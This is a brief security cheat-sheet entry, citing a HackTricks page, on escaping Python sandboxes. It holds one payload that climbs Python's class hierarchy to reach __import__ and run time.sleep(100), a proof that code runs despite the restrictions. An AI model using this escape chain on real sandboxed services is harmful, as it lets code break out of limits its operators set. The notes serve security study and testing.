# Bypass python sandbox

## Commands list

* Ref : [https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes\#executing-python-code](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#executing-python-code)

```text
# Command for sleep(100)
{}.__class__.__base__.__subclasses__()[59]()._module.__builtins__["__import__"]("time").sleep(100)



```





